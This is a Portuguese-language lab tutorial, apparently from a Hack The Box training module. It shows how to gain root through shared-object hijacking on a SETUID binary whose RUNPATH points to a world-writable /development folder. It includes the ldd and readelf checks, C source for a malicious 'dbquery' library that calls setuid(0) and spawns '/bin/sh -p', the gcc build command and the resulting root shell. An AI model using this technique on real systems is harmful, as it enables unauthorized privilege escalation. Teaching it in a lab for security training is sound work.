Programas e binários em desenvolvimento geralmente têm bibliotecas personalizadas associadas a eles. Considere o seguinte binário `SETUID`.

```shell-session
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Podemos usar [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) para imprimir o objeto compartilhado requerido por um objeto binário ou compartilhado. `Ldd` exibe a localização do objeto e o endereço hexadecimal onde ele é carregado na memória para cada uma das dependências de um programa.

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

Vemos uma biblioteca não padrão chamada `libshared.so` listada como uma dependência para o binário. Conforme declarado anteriormente, é possível carregar bibliotecas compartilhadas de locais personalizados. 

Uma dessas configurações é a configuração `RUNPATH`. Bibliotecas nesta pasta têm preferência sobre outras pastas. Isso pode ser inspecionado usando o utilitário [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) .

```shell-session
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

A configuração permite o carregamento de bibliotecas da pasta `/development`, que é gravável por todos os usuários.

Essa configuração incorreta pode ser explorada colocando uma biblioteca maliciosa em `/development`, que terá precedência sobre outras pastas porque as entradas neste arquivo são verificadas primeiro (antes de outras pastas presentes nos arquivos de configuração).

```shell-session
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Antes de compilar uma biblioteca, precisamos encontrar o nome da função chamada pelo binário.

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```shell-session
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Podemos copiar uma biblioteca existente para a pasta `development`. Executar `ldd` contra o binário lista o caminho da biblioteca como `/development/libshared.` , o que significa que ele é vulnerável. Executar o binário gera um erro informando que ele falhou em encontrar a função chamada `dbquery`. Podemos compilar um objeto compartilhado que inclui essa função.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

A função `dbquery` define nosso id de usuário como 0 (root) e executa `/bin/sh` quando chamada. Compile-a usando [GCC](https://linux.die.net/man/1/gcc) .

```shell-session
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Executar o binário novamente deve exibir o banner e abrir um shell root.

```shell-session
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```